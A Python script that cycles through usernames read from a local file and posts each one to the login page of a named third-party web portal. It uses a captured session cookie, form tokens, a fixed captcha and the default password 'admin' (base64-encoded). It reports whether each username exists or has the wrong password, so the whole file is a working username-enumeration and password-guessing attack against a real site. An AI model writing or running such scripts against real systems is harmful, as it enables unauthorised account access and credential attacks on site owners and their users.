import requests


def ask():
    try:
        headers = {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Encoding':'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Length': '449',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': 'ASP.NET_SessionId=qflelkku4oy2lb3yclcaujen',
        'Host': 'cbfx.cankaoxiaoxi.com',
        'Origin': 'http://cbfx.cankaoxiaoxi.com',
        'Referer': 'http://cbfx.cankaoxiaoxi.com/website/login_bottom.aspx',
        'Upgrade-Insecure-Requests': '1'
            }

        with open('D:\\WechatFiles\\WeChat Files\\WeChat Files\\wxid_1mcrgvm3tqud21\\FileStorage\\File\\2020-07\\name.txt','r') as r:
            name = r.readlines()
        for username in name:
            data = {
                '__VIEWSTATE': '/wEPDwULLTE3NTU4NTU5MDkPZBYCAgEPZBYCAhEPDxYCHgRUZXh0BRMyMDIwLTA3LTI5IDEyOjA5OjQwZGQYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgEFDEltYWdlQnV0dG9uMWzUhKcmBsS+DQy91h73r0EHfWOBaci3mtn2GqBnePJh',
                '__VIEWSTATEGENERATOR': '89240373',
                '__EVENTVALIDATION': '/wEWBQLUibiPBwKpwK/OBgK1qbSRCwKY2YWXBgLSwpnTCFlGbVR4ER8JCmfos9GKEQTBRkIa7ZBif9pAnXB9F32m',
                'txtLoginName': username,
                'txtPassword': 'YWRtaW4=',
                'txtCheckCode': '4384',
                'ImageButton1.x': '34',
                'ImageButton1.y': '8'
                }

            url = "http://cbfx.cankaoxiaoxi.com/website/login_bottom.aspx"
            post_ask = requests.post(url=url,headers=headers,data=data)
            if "口令不正确" in post_ask.text:
                print("口令不正确")
            elif "用户名不存在" in post_ask.text:
                print("用户名不存在")
            else:
                print("其他错误")
            # print(post_ask.text)

    except Exception as f:
        print(f)

ask()